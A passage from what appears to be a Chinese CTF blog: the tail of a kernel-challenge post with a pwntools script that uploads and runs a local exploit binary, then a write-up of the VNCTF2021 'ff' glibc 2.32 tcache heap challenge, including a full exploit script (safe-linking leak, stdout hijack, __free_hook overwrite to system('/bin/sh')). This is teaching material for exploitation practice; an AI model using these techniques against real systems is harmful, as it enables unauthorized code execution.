coding:utf8</span><br><span class="line">from pwn import *</span><br><span class="line">import base64</span><br><span class="line"> </span><br><span class="line">sh = remote(&#x27;127.0.0.1&#x27;,30000)</span><br><span class="line"> </span><br><span class="line">#exploit</span><br><span class="line">f = open(&#x27;./exp&#x27;,&#x27;rb&#x27;)</span><br><span class="line">content = f.read()</span><br><span class="line">total = len(content)</span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line"># segment send</span><br><span class="line">per_length = 0x200;</span><br><span class="line"># touch file</span><br><span class="line">sh.sendlineafter(&#x27;$ &#x27;,&#x27;touch /tmp/exploit&#x27;)</span><br><span class="line"></span><br><span class="line">log.info(&quot;Total length:%d&quot;%total)</span><br><span class="line">for i in range(0,total,per_length):</span><br><span class="line">   bstr = base64.b64encode(content[i:i+per_length])</span><br><span class="line">   sh.sendlineafter(&#x27;$ &#x27;,&#x27;echo &#123;&#125; | base64 -d &gt;&gt; /tmp/exploit&#x27;.format(bstr))</span><br><span class="line">   print(i)</span><br><span class="line">   </span><br><span class="line">if total - i &gt; 0:</span><br><span class="line">   bstr = base64.b64encode(content[total-i:total])</span><br><span class="line">   sh.sendlineafter(&#x27;$ &#x27;,&#x27;echo &#123;&#125; | base64 -d &gt;&gt; /tmp/exploit&#x27;.format(bstr))</span><br><span class="line"> </span><br><span class="line">sh.sendlineafter(&#x27;$ &#x27;,&#x27;chmod +x /tmp/exploit&#x27;)</span><br><span class="line">sh.sendlineafter(&#x27;$ &#x27;,&#x27;/tmp/exploit&#x27;)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></div></figure>

<p>(5)调试模块：</p>
<p>关于文件系统的选择方面，用精简版的Busybox开出来的qemu调试的时候获取加载模块的基地址总是出错，暂时不知道为什么后面补。</p>
<p>但是可以用2018强网杯core的文件系统，加载之后调试的基地址没问题，这个在ctfwiki上有。</p>
</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/08/14/2.32%E4%B8%8B%E7%9A%84tcache%E5%88%A9%E7%94%A8-VNCTF2021%20ff/">2.32下的tcache利用-VNCTF2021 ff</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-08-14</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2021-08-19</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>通过这题学习下2.32下的tcache，同时还学到好多东西。</p>
<p>1.先解析下题目，大概是提供了分配、释放、编辑、打印堆块的功能，不过限制了只能打印一次、编辑两次，同时还限制了不能分配0x90及以上的堆块。然后释放功能指针没清空，有UAF，保护全开。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsJXQhGvoTieV14xa.png" alt="img"></p>
<p>2.首先泄露地址：因为2.32要利用doble-free必须泄露堆地址，所以show()功能肯定先被用掉，直接从free的chunk的fd指针泄露出heap_base，因为2.32的safe-linking异或机制就是下一个chunk和heap_base异或放入fd。</p>
<p>那么就思考之后怎么泄露Libc地址，可以通过劫持IO来泄露，但是劫持IO也需要libc地址才行啊，这里就用到爆破，利用unsortebin来留下地址在tcache结构体上，然后部分写2个字节来爆破半个字节。因为IO和main_arena其实相距不是太远，调试就可以知道。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-30_17-01-47.png" alt="img"></p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#注释头</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#leak heap_base</span></span><br><span class="line">new(<span class="number">0x80</span>,<span class="string">&#x27;PIG007NB&#x27;</span>)</span><br><span class="line">free()</span><br><span class="line">show()</span><br><span class="line">heap_leak = u64(rc(<span class="number">5</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">heap_base = heap_leak*<span class="number">0x1000</span></span><br><span class="line">log.info(<span class="string">&quot;heap_base:0x%x&quot;</span>%heap_base)</span><br><span class="line"></span><br><span class="line"><span class="comment">#change key to make double free</span></span><br><span class="line">edit(<span class="string">&#x27;PIG007NBPIG007NB&#x27;</span>)</span><br><span class="line">free()</span><br><span class="line"></span><br><span class="line"><span class="comment">#change 0x290(7) to free tcache(0x290) into unsortedbin</span></span><br><span class="line">edit(p64((heap_leak) ^ (heap_base + <span class="number">0x10</span>)))</span><br><span class="line">new(<span class="number">0x80</span>, <span class="string">&#x27;PIG007NB&#x27;</span>)</span><br><span class="line">new(<span class="number">0x80</span>, <span class="string">&#x27;\x00\x00&#x27;</span> *((<span class="number">0x290</span>-<span class="number">0x20</span>)/<span class="number">0x10</span>) + <span class="string">&#x27;\x07\x00&#x27;</span>)</span><br><span class="line">free()</span><br><span class="line"><span class="comment">#--------------------------------------------</span></span><br><span class="line">new(<span class="number">0x88</span>, (<span class="string">&#x27;\x00\x00&#x27;</span> + <span class="string">&#x27;\x00\x00&#x27;</span> + <span class="string">&#x27;\x02\x00&#x27;</span> + <span class="string">&#x27;\x00\x00&#x27;</span> + <span class="string">&#x27;\x00\x00&#x27;</span> * <span class="number">2</span> + <span class="string">&#x27;\x01\x00&#x27;</span>).ljust(<span class="number">0x88</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="comment">#--------------------------------------------</span></span><br></pre></td></tr></table></div></figure>

<p>被#—————————包裹起来的部分，这里只能申请0x48或者0x88大小的，因为tcache结构体被破坏，很多bin的数量变大了，不再是0x0，但是tcache中对应的Bin链表中仍然是0x0，再申请对应大小的就会触发程序异常，其实就是放入tcache空闲bin链表的时候错误：</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-30_17-31-09.png" alt="img"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-30_17-31-31.png" alt="img"></p>
<p>3.然后就是劫持IO泄露地址:</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#注释头</span></span><br><span class="line"></span><br><span class="line">new(<span class="number">0x18</span>,p64(heap_base+<span class="number">0x330</span>)+<span class="string">&#x27;\xbb&#x27;</span>) <span class="comment">#will be used later</span></span><br><span class="line">new(<span class="number">0x18</span>,p16(<span class="number">0x66c0</span>))</span><br><span class="line">new(<span class="number">0x78</span>,p64(<span class="number">0xfbad1800</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> + p64(heap_base+<span class="number">0xa8</span>)+p64(heap_base+<span class="number">0xb0</span>)+p64(heap_base+<span class="number">0xb0</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#new(0x78,p64(0xfbad1800) + p64(0)*3 + b&#x27;\x00&#x27;)</span></span><br><span class="line"><span class="comment">#this will be OK</span></span><br><span class="line">main_arena = u64(p.recvuntil(<span class="string">&#x27;1.add&#x27;</span>)[-<span class="number">13</span>:-<span class="number">7</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0xbb</span> - <span class="number">96</span></span><br><span class="line">test = main_arena&gt;&gt;<span class="number">40</span></span><br><span class="line">log.info(<span class="string">&quot;main_arena:0x%x&quot;</span>%main_arena)</span><br><span class="line">log.info(<span class="string">&quot;test:0x%x&quot;</span>%test)</span><br><span class="line"><span class="keyword">if</span>(test != <span class="number">0x7f</span>):</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">malloc_hook = main_arena-<span class="number">0x10</span></span><br><span class="line">obj = LibcSearcher(<span class="string">&quot;__malloc_hook&quot;</span>, malloc_hook)</span><br><span class="line">libc_base = malloc_hook-obj.dump(<span class="string">&#x27;__malloc_hook&#x27;</span>)</span><br><span class="line"><span class="comment">#stdout_addr = u64(p.recvuntil(&#x27;1.add&#x27;)[-13:-7].ljust(8,b&#x27;\x00&#x27;))-132</span></span><br><span class="line"><span class="comment"># log.info(&quot;stdout_addr:0x%x&quot;%stdout_addr)</span></span><br><span class="line"><span class="comment"># obj = LibcSearcher(&quot;_IO_2_1_stdout_&quot;, stdout_addr)</span></span><br><span class="line"><span class="comment"># libc_base = stdout_addr-obj.dump(&#x27;_IO_2_1_stdout_&#x27;)</span></span><br><span class="line"></span><br><span class="line">system_addr = libc_base + obj.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">__free_hook_addr = libc_base + obj.dump(<span class="string">&quot;__free_hook&quot;</span>)</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;libc_base:0x%x&quot;</span>%libc_base)</span><br><span class="line">log.info(<span class="string">&quot;system_addr:0x%x&quot;</span>%system_addr)</span><br><span class="line">log.info(<span class="string">&quot;__free_hook_addr:0x%x&quot;</span>%__free_hook_addr)</span><br></pre></td></tr></table></div></figure>

<p>4.最后就是填充，将unsortedbin申请完之后，将unsortedbin从Tcache的结构体中脱离出来，防止再申请的时候乱套。这里直接从topchunk申请，安全一点。</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#注释头</span></span><br><span class="line"></span><br><span class="line">new(<span class="number">0x58</span>,<span class="string">&#x27;PIG007NB&#x27;</span>)</span><br><span class="line">new(<span class="number">0x58</span>,<span class="string">&#x27;PIG007NB&#x27;</span>)</span><br><span class="line">new(<span class="number">0x58</span>,<span class="string">&#x27;PIG007NB&#x27;</span>)</span><br><span class="line">new(<span class="number">0x58</span>,<span class="string">&#x27;PIG007NB&#x27;</span>)</span><br><span class="line">new(<span class="number">0x18</span>,<span class="string">&#x27;PIG007NB&#x27;</span>)</span><br><span class="line">new(<span class="number">0x18</span>,<span class="string">&#x27;PIG007NB&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#one_gadget = libc_base + 0xdf54c</span></span><br><span class="line">new(<span class="number">0x88</span>, p64(__free_hook_addr^(heap_base/<span class="number">0x1000</span>)))</span><br><span class="line">new(<span class="number">0x38</span>, p64(system_addr))</span><br><span class="line">new(<span class="number">0x38</span>, p64(system_addr))</span><br><span class="line"></span><br><span class="line">new(<span class="number">0x10</span>, <span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line">free()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></div></figure>

<p>5.最后贴个爆破的exp，有些借鉴了arttnba3师傅的：</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://arttnba3.cn/2021/05/10/NOTE-0X04-GLIBC_HEAP-EXPLOIT/" >https://arttnba3.cn/2021/05/10/NOTE-0X04-GLIBC_HEAP-EXPLOIT/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#注释头</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -*- coding:UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#context</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">SigreturnFrame(kernel = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">binary = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line"><span class="comment">#libc_file = &quot;./libc-2.24.so&quot;</span></span><br><span class="line"><span class="comment">#libc_file = &quot;/lib/x86_64-linux-gnu/libc-2.27.so&quot;</span></span><br><span class="line"><span class="comment">#libc_file = &quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#libcsearcher use</span></span><br><span class="line"><span class="comment">#32bit:malloc_hook = main_arena-0x18</span></span><br><span class="line"><span class="comment">#32bit:main_arena+56(unsortedbin_addr)</span></span><br><span class="line"><span class="comment">#64bit:main_arena+96(unsortedbin_addr)//88 aslo have</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">malloc_hook = main_arena-0x10</span></span><br><span class="line"><span class="string">obj = LibcSearcher(&quot;__malloc_hook&quot;, malloc_hook)</span></span><br><span class="line"><span class="string">obj = LibcSearcher(&quot;fgets&quot;, 0Xd90)</span></span><br><span class="line"><span class="string">libc_base = fgets-obj.dump(&#x27;fgets&#x27;)</span></span><br><span class="line"><span class="string">system_addr = libc_base + obj.dump(&quot;system&quot;)        #system</span></span><br><span class="line"><span class="string">binsh_addr = libc_base + obj.dump(&quot;str_bin_sh&quot;)</span></span><br><span class="line"><span class="string">log.info(&quot;system_addr:0x%x&quot;%system_addr)</span></span><br><span class="line"><span class="string">log.info(&quot;libc_base:0x%x&quot;%libc_base)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#malloc_hook,main_aren Find</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">python2 LibcOffset.py libc-2.23.so  </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#without stripped</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">puts_got = elf.got[&#x27;puts&#x27;]</span></span><br><span class="line"><span class="string">puts_plt = elf.plt[&#x27;puts&#x27;]</span></span><br><span class="line"><span class="string">system_plt = elf.plt[&#x27;system&#x27;]</span></span><br><span class="line"><span class="string">read_plt = elf.plt[&#x27;read&#x27;]</span></span><br><span class="line"><span class="string">main_addr = elf.sym[&#x27;main&#x27;]</span></span><br><span class="line"><span class="string">free_hook = libc_base + libc.sym[&#x27;__free_hook&#x27;]</span></span><br><span class="line"><span class="string">system_addr = libc_base + libc.sym[&#x27;system&#x27;]</span></span><br><span class="line"><span class="string">binsh_addr = libc_base + libc.search(&#x27;/bin/sh&#x27;).next()</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#usually gadget:</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">u_gadget1 = elf.sym[&#x27;__libc_csu_init&#x27;] + 0x5a</span></span><br><span class="line"><span class="string">u_gadget2 = elf.sym[&#x27;__libc_csu_init&#x27;] + 0x40</span></span><br><span class="line"><span class="string">pop_rdi_ret = elf.sym[&#x27;__libc_csu_init&#x27;] + 0x63</span></span><br><span class="line"><span class="string">ret = elf.sym[&#x27;__libc_csu_init&#x27;] + 0x64</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    <span class="comment">#p = process(binary)</span></span><br><span class="line">    p = process([<span class="string">&#x27;/home/hacker/glibc/2.32/glibc-2.32_build/elf/ld.so&#x27;</span>, <span class="string">&#x27;./pwn&#x27;</span>], env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:<span class="string">&quot;/home/hacker/glibc/2.32/glibc-2.32_build/libc.so.6&quot;</span>&#125;)</span><br><span class="line">    <span class="comment">#p = process([&#x27;./ld-2.32.so&#x27;, &#x27;./pwn&#x27;], env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc.so.6&quot;&#125;)</span></span><br><span class="line">    elf = ELF(binary)</span><br><span class="line">    <span class="comment">#libc = ELF(libc_file)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="string">&quot;49153&quot;</span>)</span><br><span class="line">    elf = ELF(binary)</span><br><span class="line">    libc = ELF(libc_file)</span><br><span class="line"></span><br><span class="line">sd = <span class="keyword">lambda</span> s:p.send(s)</span><br><span class="line">sl = <span class="keyword">lambda</span> s:p.sendline(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> s:p.recv(s)</span><br><span class="line">ru = <span class="keyword">lambda</span> s:p.recvuntil(s)</span><br><span class="line">rl = <span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">sa = <span class="keyword">lambda</span> a,s:p.sendafter(a,s)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,s:p.sendlineafter(a,s)  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">command</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">b&quot;&gt;&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(command).encode())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span>(<span class="params">size, content</span>):</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Size:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Content:&quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>():</span></span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">content</span>):</span></span><br><span class="line">    cmd(<span class="number">5</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Content:&quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#leak heap_base</span></span><br><span class="line">    new(<span class="number">0x80</span>,<span class="string">&#x27;PIG007NB&#x27;</span>)</span><br><span class="line">    free()</span><br><span class="line">    show()</span><br><span class="line">    heap_leak = u64(rc(<span class="number">5</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    heap_base = heap_leak*<span class="number">0x1000</span></span><br><span class="line">    log.info(<span class="string">&quot;heap_base:0x%x&quot;</span>%heap_base)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#change key to make double free</span></span><br><span class="line">    edit(<span class="string">&#x27;PIG007NBPIG007NB&#x27;</span>)</span><br><span class="line">    free()</span><br><span class="line"></span><br><span class="line">    <span class="comment">#change 0x290(7) to free tcache(0x290) into unsortedbin</span></span><br><span class="line">    edit(p64((heap_leak) ^ (heap_base + <span class="number">0x10</span>)))</span><br><span class="line">    new(<span class="number">0x80</span>, <span class="string">&#x27;PIG007NB&#x27;</span>)</span><br><span class="line">    new(<span class="number">0x80</span>, <span class="string">&#x27;\x00\x00&#x27;</span> *((<span class="number">0x290</span>-<span class="number">0x20</span>)/<span class="number">0x10</span>) + <span class="string">&#x27;\x07\x00&#x27;</span>)</span><br><span class="line">    free()</span><br><span class="line">    <span class="comment">#--------------------------------------------</span></span><br><span class="line">    new(<span class="number">0x88</span>, (<span class="string">&#x27;\x00\x00&#x27;</span> + <span class="string">&#x27;\x00\x00&#x27;</span> + <span class="string">&#x27;\x02\x00&#x27;</span> + <span class="string">&#x27;\x00\x00&#x27;</span> + <span class="string">&#x27;\x00\x00&#x27;</span> * <span class="number">2</span> + <span class="string">&#x27;\x01\x00&#x27;</span>).ljust(<span class="number">0x88</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    <span class="comment">#--------------------------------------------</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    new(<span class="number">0x18</span>,p64(heap_base+<span class="number">0x330</span>)+<span class="string">&#x27;\xbb&#x27;</span>) <span class="comment">#will be used later</span></span><br><span class="line">    new(<span class="number">0x18</span>,p16(<span class="number">0x66c0</span>))</span><br><span class="line">    new(<span class="number">0x78</span>,p64(<span class="number">0xfbad1800</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> + p64(heap_base+<span class="number">0xa8</span>)+p64(heap_base+<span class="number">0xb0</span>)+p64(heap_base+<span class="number">0xb0</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment">#new(0x78,p64(0xfbad1800) + p64(0)*3 + b&#x27;\x00&#x27;)</span></span><br><span class="line">    <span class="comment">#this will be OK</span></span><br><span class="line">    main_arena = u64(p.recvuntil(<span class="string">&#x27;1.add&#x27;</span>)[-<span class="number">13</span>:-<span class="number">7</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0xbb</span> - <span class="number">96</span></span><br><span class="line">    test = main_arena&gt;&gt;<span class="number">40</span></span><br><span class="line">    log.info(<span class="string">&quot;main_arena:0x%x&quot;</span>%main_arena)</span><br><span class="line">    log.info(<span class="string">&quot;test:0x%x&quot;</span>%test)</span><br><span class="line">    <span class="keyword">if</span>(test != <span class="number">0x7f</span>):</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    malloc_hook = main_arena-<span class="number">0x10</span></span><br><span class="line">    obj = LibcSearcher(<span class="string">&quot;__malloc_hook&quot;</span>, malloc_hook)</span><br><span class="line">    libc_base = malloc_hook-obj.dump(<span class="string">&#x27;__malloc_hook&#x27;</span>)</span><br><span class="line">    <span class="comment">#stdout_addr = u64(p.recvuntil(&#x27;1.add&#x27;)[-13:-7].ljust(8,b&#x27;\x00&#x27;))-132</span></span><br><span class="line">    <span class="comment"># log.info(&quot;stdout_addr:0x%x&quot;%stdout_addr)</span></span><br><span class="line">    <span class="comment"># obj = LibcSearcher(&quot;_IO_2_1_stdout_&quot;, stdout_addr)</span></span><br><span class="line">    <span class="comment"># libc_base = stdout_addr-obj.dump(&#x27;_IO_2_1_stdout_&#x27;)</span></span><br><span class="line"></span><br><span class="line">    system_addr = libc_base + obj.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">    __free_hook_addr = libc_base + obj.dump(<span class="string">&quot;__free_hook&quot;</span>)</span><br><span class="line"></span><br><span class="line">    log.info(<span class="string">&quot;libc_base:0x%x&quot;</span>%libc_base)</span><br><span class="line">    log.info(<span class="string">&quot;system_addr:0x%x&quot;</span>%system_addr)</span><br><span class="line">    log.info(<span class="string">&quot;__free_hook_addr:0x%x&quot;</span>%__free_hook_addr)</span><br><span class="line"></span><br><span class="line">    new(<span class="number">0x58</span>,<span class="string">&#x27;PIG007NB&#x27;</span>)</span><br><span class="line">    new(<span class="number">0x58</span>,<span class="string">&#x27;PIG007NB&#x27;</span>)</span><br><span class="line">    new(<span class="number">0x58</span>,<span class="string">&#x27;PIG007NB&#x27;</span>)</span><br><span class="line">    new(<span class="number">0x58</span>,<span class="string">&#x27;PIG007NB&#x27;</span>)</span><br><span class="line">    new(<span class="number">0x18</span>,<span class="string">&#x27;PIG007NB&#x27;</span>)</span><br><span class="line">    new(<span class="number">0x18</span>,<span class="string">&#x27;PIG007NB&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">#one_gadget = libc_base + 0xdf54c</span></span><br><span class="line">    new(<span class="number">0x88</span>, p64(__free_hook_addr^(heap_base/<span class="number">0x1000</span>)))</span><br><span class="line">    new(<span class="number">0x38</span>, p64(system_addr))</span><br><span class="line">    new(<span class="number">0x38</span>, p64(system_addr))</span><br><span class="line"></span><br><span class="line">    new(<span class="number">0x10</span>, <span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">    pause()</span><br><span class="line">    free()</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">count = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span 